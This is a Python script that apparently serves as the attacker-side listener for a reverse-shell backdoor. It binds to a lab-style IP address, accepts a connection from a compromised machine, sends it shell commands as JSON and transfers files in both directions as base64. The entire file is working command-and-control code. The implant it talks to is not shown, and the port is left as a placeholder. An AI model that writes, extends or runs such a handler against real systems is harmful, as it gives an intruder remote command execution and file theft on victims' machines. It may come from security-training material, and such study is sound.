import socket
import simplejson
import base64
class SocketListener():
    
    def __init__(self,ip,port):
        slistener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        slistener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        slistener.bind((ip,port))
        slistener.listen()
        (self.connection, address) = slistener.accept()
        print(f"Connection OK from {address}")
    
    def send_json(self,data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def recv_json(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
    def command_execution(self,command):
        self.send_json(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        
        return self.recv_json()        
    def write_file(self,file,content):
        with open(file,"wb") as efile:
            efile.write(base64.b64decode(content))
            return "Download OK"
    def read_file(self,file):
        with open(file,"rb") as efile:
            return base64.b64encode(efile.read())


    def start(self):
        while True:
            command = input("Enter command:")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    content = self.read_file(command[1]) 
                    command.append(content)

                command_o = self.command_execution(command)
                if command[0] == "download" and "Error!" not in command_o:
                    command_o = self.write_file(command[1],command_o)
            except Exception:
                command_o = "Error"
            print(command_o)


if __name__== "__main__":
    socket_listener = SocketListener("10.0.2.X",your_port)
    socket_listener.start()